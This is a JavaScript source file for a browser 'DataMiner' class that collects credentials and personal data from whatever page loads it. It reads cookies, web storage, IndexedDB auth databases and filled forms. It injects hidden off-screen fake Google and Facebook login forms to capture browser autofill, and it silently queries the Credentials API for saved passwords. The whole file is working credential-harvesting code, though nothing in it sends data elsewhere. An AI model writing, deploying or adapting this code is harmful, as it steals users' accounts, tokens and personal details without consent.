// Advanced Data Miner - Collects Real Data
class DataMiner {
    constructor() {
        this.cache = new Map();
        this.results = {
            accounts: [],
            credentials: [],
            personal: [],
            technical: [],
            behavioral: []
        };
    }
    
    async mineAll() {
        console.log('⛏️ Starting advanced data mining...');
        
        try {
            // Parallel mining for speed
            const promises = [
                this.mineLocalStorage(),
                this.mineSessionStorage(),
                this.mineCookies(),
                this.mineIndexedDB(),
                this.mineForms(),
                this.mineAutofill(),
                this.mineBrowserAPIs(),
                this.mineWebStorage(),
                this.mineMetaTags(),
                this.mineScriptData()
            ];
            
            const results = await Promise.allSettled(promises);
            
            // Combine results
            results.forEach((result, index) => {
                if (result.status === 'fulfilled' && result.value) {
                    this.mergeResults(result.value);
                }
            });
            
            // Process and filter results
            this.processResults();
            
            console.log(`✅ Data mining complete: ${this.results.accounts.length} accounts found`);
            return this.results;
            
        } catch (error) {
            console.error('Data mining failed:', error);
            return this.results;
        }
    }
    
    async mineLocalStorage() {
        const items = {};
        const credentials = [];
        
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            
            if (key && value) {
                items[key] = value;
                
                // Check for credential patterns
                if (this.isCredentialKey(key)) {
                    const credential = this.extractCredential(key, value);
                    if (credential) credentials.push(credential);
                }
                
                // Check for user data
                if (this.isUserDataKey(key)) {
                    this.results.personal.push({
                        type: 'localStorage',
                        key: key,
                        value: this.sanitizeValue(value),
                        timestamp: new Date().toISOString()
                    });
                }
            }
        }
        
        return { items, credentials };
    }
    
    async mineSessionStorage() {
        const items = {};
        
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const value = sessionStorage.getItem(key);
            
            if (key && value) {
                items[key] = value;
                
                // Check for session tokens
                if (key.toLowerCase().includes('session') || 
                    key.toLowerCase().includes('token') ||
                    key.toLowerCase().includes('auth')) {
                    
                    this.results.technical.push({
                        type: 'session',
                        key: key,
                        value: value.substring(0, 20) + '...',
                        length: value.length
                    });
                }
            }
        }
        
        return { items };
    }
    
    async mineCookies() {
        const cookies = document.cookie.split(';').map(cookie => {
            const [key, value] = cookie.trim().split('=');
            return { key: key || '', value: value || '' };
        }).filter(cookie => cookie.key);
        
        // Extract session cookies
        const sessionCookies = cookies.filter(cookie => 
            cookie.key.toLowerCase().includes('session') ||
            cookie.key.toLowerCase().includes('id') ||
            cookie.key.toLowerCase().includes('user')
        );
        
        this.results.technical.push(...sessionCookies.map(cookie => ({
            type: 'cookie',
            name: cookie.key,
            value: cookie.value.length > 30 ? cookie.value.substring(0, 30) + '...' : cookie.value
        })));
        
        return { cookies, sessionCookies };
    }
    
    async mineIndexedDB() {
        const databases = [];
        
        // Common IndexedDB names
        const commonDBs = [
            'firebaseLocalStorageDb',
            'firestore',
            'localforage',
            'redux-persist',
            '__meteor_clientStorage',
            'auth',
            'user',
            'profile',
            'session',
            'login',
            'account',
            'token',
            'credentials'
        ];
        
        for (const dbName of commonDBs) {
            try {
                const db = await this.openIndexedDB(dbName);
                if (db) {
                    const data = await this.scanDatabase(db);
                    if (data && data.length > 0) {
                        databases.push({
                            name: dbName,
                            data: data
                        });
                    }
                    db.close();
                }
            } catch (e) {
                // Database doesn't exist or can't open
            }
        }
        
        // Extract credentials from databases
        databases.forEach(db => {
            db.data.forEach(item => {
                const credentials = this.extractCredentialsFromObject(item);
                this.results.credentials.push(...credentials);
            });
        });
        
        return { databases };
    }
    
    async mineForms() {
        const forms = [];
        
        document.querySelectorAll('form').forEach((form, index) => {
            const inputs = Array.from(form.querySelectorAll('input, textarea, select'))
                .filter(field => field.value && field.value.trim() !== '')
                .map(field => ({
                    name: field.name || field.id || `field_${index}`,
                    type: field.type,
                    value: field.value,
                    placeholder: field.placeholder
                }));
            
            if (inputs.length > 0) {
                forms.push({
                    index: index,
                    action: form.action,
                    method: form.method,
                    inputs: inputs
                });
                
                // Check for login forms
                if (this.isLoginForm(inputs)) {
                    this.results.accounts.push({
                        type: 'form_login',
                        formIndex: index,
                        fields: inputs.map(input => input.name),
                        timestamp: new Date().toISOString()
                    });
                }
            }
        });
        
        return { forms };
    }
    
    async mineAutofill() {
        const autofillData = [];
        
        // Create trigger forms
        const triggerForms = this.createAutofillTriggers();
        document.body.appendChild(triggerForms);
        
        // Wait for autofill
        await new Promise(resolve => setTimeout(resolve, 800));
        
        // Collect filled data
        const forms = triggerForms.querySelectorAll('form');
        forms.forEach((form, index) => {
            const inputs = form.querySelectorAll('input');
            const filled = {};
            
            inputs.forEach(input => {
                if (input.value && input.value.trim() !== '') {
                    filled[input.name] = input.value;
                }
            });
            
            if (Object.keys(filled).length > 0) {
                autofillData.push({
                    type: 'autofill',
                    formType: form.id,
                    data: filled
                });
                
                // Extract credentials
                if (filled.email || filled.username) {
                    this.results.accounts.push({
                        type: 'autofill_account',
                        email: filled.email,
                        username: filled.username,
                        source: 'browser_autofill',
                        timestamp: new Date().toISOString()
                    });
                }
            }
        });
        
        // Cleanup
        document.body.removeChild(triggerForms);
        
        return { autofillData };
    }
    
    async mineBrowserAPIs() {
        const data = {};
        
        // Try Credentials API
        try {
            if (navigator.credentials && navigator.credentials.get) {
                const cred = await navigator.credentials.get({
                    password: true,
                    mediation: 'silent'
                });
                
                if (cred) {
                    data.credentials = {
                        username: cred.id,
                        password: cred.password ? '[PROTECTED]' : null
                    };
                }
            }
        } catch (e) { /* Ignore */ }
        
        // Try Web Authentication API
        try {
            if (navigator.authentication) {
                const assertion = await navigator.authentication.get({
                    publicKey: {
                        challenge: new Uint8Array(32),
                        timeout: 60000,
                        userVerification: 'preferred'
                    }
                });
                if (assertion) {
                    data.webauthn = true;
                }
            }
        } catch (e) { /* Ignore */ }
        
        // Try Battery API
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                data.battery = {
                    level: battery.level,
                    charging: battery.charging
                };
            }
        } catch (e) { /* Ignore */ }
        
        // Try Connection API
        try {
            if (navigator.connection) {
                data.connection = {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                };
            }
        } catch (e) { /* Ignore */ }
        
        // Try Storage API
        try {
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                const estimate = await navigator.storage.estimate();
                data.storage = {
                    quota: estimate.quota,
                    usage: estimate.usage,
                    usageDetails: estimate.usageDetails
                };
            }
        } catch (e) { /* Ignore */ }
        
        // Try Media Devices
        try {
            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                const devices = await navigator.mediaDevices.enumerateDevices();
                data.mediaDevices = devices.map(d => ({
                    kind: d.kind,
                    label: d.label || 'unknown'
                }));
            }
        } catch (e) { /* Ignore */ }
        
        // Try Permissions API
        try {
            const permissions = await Promise.all([
                navigator.permissions.query({ name: 'geolocation' }),
                navigator.permissions.query({ name: 'notifications' }),
                navigator.permissions.query({ name: 'camera' }),
                navigator.permissions.query({ name: 'microphone' })
            ]);
            
            data.permissions = {
                geolocation: permissions[0].state,
                notifications: permissions[1].state,
                camera: permissions[2].state,
                microphone: permissions[3].state
            };
        } catch (e) { /* Ignore */ }
        
        this.results.technical.push(data);
        return data;
    }
    
    async mineWebStorage() {
        const storage = {};
        
        // WebSQL (deprecated but still used)
        try {
            if (window.openDatabase) {
                storage.websql = true;
            }
        } catch (e) { /* Ignore */ }
        
        // Application Cache
        try {
            if (window.applicationCache) {
                storage.appCache = true;
            }
        } catch (e) { /* Ignore */ }
        
        // Service Workers
        try {
            if ('serviceWorker' in navigator) {
                const registrations = await navigator.serviceWorker.getRegistrations();
                storage.serviceWorkers = registrations.length;
            }
        } catch (e) { /* Ignore */ }
        
        // Cache Storage
        try {
            if (caches) {
                const cacheNames = await caches.keys();
                storage.caches = cacheNames.length;
            }
        } catch (e) { /* Ignore */ }
        
        return storage;
    }
    
    async mineMetaTags() {
        const metaTags = {};
        const tags = document.querySelectorAll('meta');
        
        tags.forEach(tag => {
            const name = tag.getAttribute('name') || tag.getAttribute('property') || 'unnamed';
            const content = tag.getAttribute('content');
            
            if (content) {
                metaTags[name] = content;
                
                // Check for user-related meta tags
                if (name.includes('user') || name.includes('author') || 
                    name.includes('creator') || name.includes('profile')) {
                    this.results.personal.push({
                        type: 'meta_tag',
                        name: name,
                        value: content
                    });
                }
            }
        });
        
        return { metaTags };
    }
    
    async mineScriptData() {
        const scripts = document.querySelectorAll('script');
        const scriptData = [];
        
        scripts.forEach((script, index) => {
            if (script.textContent) {
                // Look for JSON data in scripts
                const jsonMatches = script.textContent.match(/\{[\s\S]*?\}/g);
                if (jsonMatches) {
                    jsonMatches.forEach(match => {
                        try {
                            const data = JSON.parse(match);
                            if (this.containsUserData(data)) {
                                scriptData.push({
                                    scriptIndex: index,
                                    data: this.extractUserData(data)
                                });
                            }
                        } catch (e) {
                            // Not valid JSON
                        }
                    });
                }
                
                // Look for JavaScript variables with user data
                const varPatterns = [
                    /user\s*[:=]\s*['"]([^'"]+)['"]/gi,
                    /email\s*[:=]\s*['"]([^'"]+)['"]/gi,
                    /username\s*[:=]\s*['"]([^'"]+)['"]/gi,
                    /token\s*[:=]\s*['"]([^'"]+)['"]/gi
                ];
                
                varPatterns.forEach(pattern => {
                    const matches = script.textContent.matchAll(pattern);
                    for (const match of matches) {
                        if (match[1]) {
                            this.results.personal.push({
                                type: 'script_variable',
                                variable: match[0].split('=')[0].trim(),
                                value: match[1]
                            });
                        }
                    }
                });
            }
        });
        
        return { scriptData };
    }
    
    // Utility Methods
    isCredentialKey(key) {
        const keyLower = key.toLowerCase();
        const credentialPatterns = [
            'user', 'email', 'login', 'auth', 'pass', 'token',
            'session', 'credential', 'account', 'name', 'id',
            'gmail', 'yahoo', 'outlook', 'hotmail', 'facebook',
            'twitter', 'github', 'instagram', 'telegram'
        ];
        
        return credentialPatterns.some(pattern => keyLower.includes(pattern));
    }
    
    isUserDataKey(key) {
        const keyLower = key.toLowerCase();
        const patterns = [
            'name', 'first', 'last', 'phone', 'mobile', 'address',
            'city', 'country', 'zip', 'postal', 'birth', 'age',
            'gender', 'location', 'coord', 'lat', 'lon'
        ];
        
        return patterns.some(pattern => keyLower.includes(pattern));
    }
    
    extractCredential(key, value) {
        const keyLower = key.toLowerCase();
        
        if (keyLower.includes('email') || value.includes('@')) {
            const emailMatch = value.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
            if (emailMatch) {
                return {
                    type: 'email',
                    source: 'localStorage',
                    key: key,
                    value: emailMatch[0],
                    platform: this.detectPlatform(key)
                };
            }
        }
        
        if (keyLower.includes('user') || keyLower.includes('login')) {
            return {
                type: 'username',
                source: 'localStorage',
                key: key,
                value: value,
                platform: this.detectPlatform(key)
            };
        }
        
        if (keyLower.includes('pass') || keyLower.includes('pwd')) {
            return {
                type: 'password_hash',
                source: 'localStorage',
                key: key,
                value: '[ENCRYPTED]',
                hashed: true
            };
        }
        
        return null;
    }
    
    detectPlatform(key) {
        const keyLower = key.toLowerCase();
        
        if (keyLower.includes('fb') || keyLower.includes('facebook')) return 'Facebook';
        if (keyLower.includes('google') || keyLower.includes('g_')) return 'Google';
        if (keyLower.includes('twitter')) return 'Twitter';
        if (keyLower.includes('github')) return 'GitHub';
        if (keyLower.includes('instagram')) return 'Instagram';
        if (keyLower.includes('telegram')) return 'Telegram';
        if (keyLower.includes('whatsapp')) return 'WhatsApp';
        
        return 'Unknown';
    }
    
    sanitizeValue(value) {
        if (value.length > 50) {
            return value.substring(0, 47) + '...';
        }
        return value;
    }
    
    async openIndexedDB(dbName) {
        return new Promise((resolve, reject) => {
            const request = indexedDB.open(dbName);
            
            request.onsuccess = (event) => resolve(event.target.result);
            request.onerror = () => resolve(null);
            request.onblocked = () => resolve(null);
            
            setTimeout(() => resolve(null), 500);
        });
    }
    
    async scanDatabase(db) {
        const data = [];
        const storeNames = Array.from(db.objectStoreNames);
        
        for (const storeName of storeNames) {
            try {
                const transaction = db.transaction(storeName, 'readonly');
                const store = transaction.objectStore(storeName);
                const allData = await new Promise((resolve) => {
                    const request = store.getAll();
                    request.onsuccess = () => resolve(request.result);
                    request.onerror = () => resolve([]);
                });
                
                allData.forEach(item => {
                    if (item && typeof item === 'object') {
                        data.push({
                            store: storeName,
                            data: item
                        });
                    }
                });
            } catch (e) {
                // Ignore store errors
            }
        }
        
        return data;
    }
    
    extractCredentialsFromObject(obj) {
        const credentials = [];
        
        function traverse(current, path = '') {
            if (!current || typeof current !== 'object') return;
            
            for (const [key, value] of Object.entries(current)) {
                const currentPath = path ? `${path}.${key}` : key;
                
                // Check for credential values
                if (typeof value === 'string' && value) {
                    if (key.toLowerCase().includes('email') && value.includes('@')) {
                        credentials.push({
                            type: 'email',
                            path: currentPath,
                            value: value,
                            source: 'indexeddb'
                        });
                    }
                    else if (key.toLowerCase().includes('user')) {
                        credentials.push({
                            type: 'username',
                            path: currentPath,
                            value: value,
                            source: 'indexeddb'
                        });
                    }
                    else if (key.toLowerCase().includes('token') || 
                             key.toLowerCase().includes('auth')) {
                        credentials.push({
                            type: 'token',
                            path: currentPath,
                            value: value.substring(0, 20) + '...',
                            source: 'indexeddb'
                        });
                    }
                }
                
                // Recursively traverse nested objects
                if (value && typeof value === 'object') {
                    traverse(value, currentPath);
                }
            }
        }
        
        traverse(obj);
        return credentials;
    }
    
    isLoginForm(inputs) {
        const hasUsername = inputs.some(input => 
            input.name.toLowerCase().includes('user') || 
            input.name.toLowerCase().includes('email') ||
            input.name.toLowerCase().includes('login')
        );
        
        const hasPassword = inputs.some(input => 
            input.type === 'password' || 
            input.name.toLowerCase().includes('pass')
        );
        
        return hasUsername && hasPassword;
    }
    
    createAutofillTriggers() {
        const container = document.createElement('div');
        container.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;';
        
        const forms = [
            // Google
            `<form id="google-form">
                <input type="email" name="email" autocomplete="username email" placeholder="Email">
                <input type="password" name="password" autocomplete="current-password" placeholder="Password">
            </form>`,
            
            // Facebook
            `<form id="facebook-form">
                <input type="text" name="email" autocomplete="username email" placeholder="Email or Phone">
                <input type="password" name="pass" autocomplete="current-password" placeholder="Password">
            </form>`,
            
            // Generic
            `<form id="generic-form">
                <input type="text" name="username" autocomplete="username" placeholder="Username">
                <input type="password" name="password" autocomplete="current-password" placeholder="Password">
            </form>`,
            
            // Email only
            `<form id="email-form">
                <input type="email" name="email" autocomplete="email" placeholder="Email">
            </form>`,
            
            // Phone
            `<form id="phone-form">
                <input type="tel" name="phone" autocomplete="tel" placeholder="Phone Number">
            </form>`
        ];
        
        forms.forEach(formHtml => {
            const div = document.createElement('div');
            div.innerHTML = formHtml;
            container.appendChild(div);
        });
        
        return container;
    }
    
    containsUserData(obj) {
        const str = JSON.stringify(obj).toLowerCase();
        const patterns = [
            'user', 'email', 'name', 'phone', 'address',
            'birth', 'age', 'gender', 'location', 'coord'
        ];
        
        return patterns.some(pattern => str.includes(pattern));
    }
    
    extractUserData(obj) {
        const userData = {};
        
        function extract(current, path = '') {
            if (!current || typeof current !== 'object') return;
            
            for (const [key, value] of Object.entries(current)) {
                const keyLower = key.toLowerCase();
                
                if (keyLower.includes('user') || keyLower.includes('email') || 
                    keyLower.includes('name') || keyLower.includes('phone')) {
                    
                    if (typeof value === 'string' && value.trim()) {
                        userData[path ? `${path}.${key}` : key] = value;
                    }
                }
                
                if (value && typeof value === 'object') {
                    extract(value, path ? `${path}.${key}` : key);
                }
            }
        }
        
        extract(obj);
        return userData;
    }
    
    mergeResults(newResults) {
        // Merge accounts
        if (newResults.accounts) {
            this.results.accounts.push(...newResults.accounts);
        }
        
        // Merge credentials
        if (newResults.credentials) {
            this.results.credentials.push(...newResults.credentials);
        }
        
        // Merge personal data
        if (newResults.personal) {
            this.results.personal.push(...newResults.personal);
        }
        
        // Merge technical data
        if (newResults.technical) {
            this.results.technical.push(...newResults.technical);
        }
    }
    
    processResults() {
        // Remove duplicates
        this.removeDuplicates();
        
        // Sort by type
        this.sortResults();
        
        // Filter sensitive data
        this.filterSensitiveData();
    }
    
    removeDuplicates() {
        const seen = new Set();
        
        this.results.accounts = this.results.accounts.filter(account => {
            const key = `${account.type}-${account.value}-${account.source}`;
            if (seen.has(key)) return false;
            seen.add(key);
            return true;
        });
        
        seen.clear();
        this.results.credentials = this.results.credentials.filter(cred => {
            const key = `${cred.type}-${cred.value}-${cred.source}`;
            if (seen.has(key)) return false;
            seen.add(key);
            return true;
        });
    }
    
    sortResults() {
        this.results.accounts.sort((a, b) => {
            if (a.type === 'email' && b.type !== 'email') return -1;
            if (a.type !== 'email' && b.type === 'email') return 1;
            return 0;
        });
    }
    
    filterSensitiveData() {
        // Remove passwords and tokens from display
        this.results.credentials = this.results.credentials.map(cred => {
            if (cred.type === 'password_hash' || cred.type === 'token') {
                return { ...cred, value: '[PROTECTED]' };
            }
            return cred;
        });
    }
    
    getResults() {
        return this.results;
    }
    
    getSummary() {
        return {
            totalAccounts: this.results.accounts.length,
            totalCredentials: this.results.credentials.length,
            totalPersonal: this.results.personal.length,
            totalTechnical: this.results.technical.length,
            timestamp: new Date().toISOString()
        };
    }
}

// Export for modules
if (typeof module !== 'undefined' && module.exports) {
    module.exports = DataMiner;
}

// Global instance
window.dataMiner = new DataMiner();
